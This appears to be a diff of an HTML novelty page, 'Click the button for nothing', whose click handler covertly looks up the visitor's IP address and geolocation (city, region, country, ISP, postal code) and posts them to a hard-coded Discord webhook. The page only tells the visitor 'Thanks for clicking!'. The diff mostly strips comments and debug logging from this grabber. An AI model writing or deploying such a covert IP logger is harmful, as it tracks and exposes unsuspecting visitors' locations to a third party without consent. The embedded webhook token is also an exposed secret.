@@ -43,7 +43,6 @@
             font-size: 1.2em;
             color: #e0e0e0;
         }
-        /* Animation effect */
         .animate {
             transform: scale(0.9);
         }
@@ -51,14 +50,14 @@
 </head>
 <body>
     <h1>Click the button for nothing</h1>
-    <button id="sendInfoButton">click me!</button>
-    <div id="loading">wait for nothing...</div>
+    <button id="sendInfoButton">Click me!</button>
+    <div id="loading">Wait for nothing...</div>
     <div id="message"></div>
 
     <script>
         document.getElementById("sendInfoButton").addEventListener("click", function() {
             const button = this;
-            button.classList.add("animate"); // Add animation class
+            button.classList.add("animate");
             document.getElementById("loading").style.display = "block";
             document.getElementById("message").innerText = "";
 
@@ -66,46 +65,43 @@
             fetch("https://api.ipify.org?format=json")
                 .then(response => {
                     if (!response.ok) {
-                        console.error('Failed to fetch IP address');
                         throw new Error('Failed to fetch IP address');
                     }
-                    return response.json(); // Return JSON directly
+                    return response.json();
                 })
                 .then(ipData => {
-                    console.log('IP Data:', ipData); // Debug log
                     const ip = ipData.ip;
                     return fetch(`https://ipapi.co/${ip}/json/`);
                 })
                 .then(response => {
                     if (!response.ok) {
-                        console.error('Failed to fetch IP details');
                         throw new Error('Failed to fetch IP details');
                     }
-                    return response.json(); // Return JSON directly
+                    return response.json();
                 })
                 .then(data => {
-                    console.log('IP Details:', data); // Debug log
                     const webhookUrl = 'https://discord.com/api/webhooks/1302270863206387845/a2WPDa6eWWgHRH3UOHX5kccg-demTyZUTyOVKzpplCEz4mDpdds4jf_5Ke-TyGAE0d9z';
                     const message = {
                         content: `<@1276852876274307082> Here is the IP information:\n\n**IP Address:** ${data.ip}\n**Location:** ${data.city}, ${data.region}, ${data.country_name}\n**ISP:** ${data.org}\n**Postal Code:** ${data.postal}`
                     };
                     return fetch(webhookUrl, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
                         body: JSON.stringify(message)
                     });
                 })
                 .then(response => {
-                    button.classList.remove("animate"); // Remove animation class
+                    button.classList.remove("animate");
                     document.getElementById("loading").style.display = "none";
                     if (!response.ok) {
-                        console.error('Error sending message to Discord');
-                        throw new Error('Error sending message to Discord');
+                        throw new Error('Failed to send message to Discord');
                     }
                     document.getElementById("message").innerText = 'Thanks for clicking!';
                 })
                 .catch(error => {
-                    button.classList.remove("animate"); // Remove animation class
+                    button.classList.remove("animate");
                     document.getElementById("loading").style.display = "none";
                     document.getElementById("message").innerText = 'Error occurred. Please try again.'; // Generic error message
                     console.error('Error:', error); // Log the error for debugging
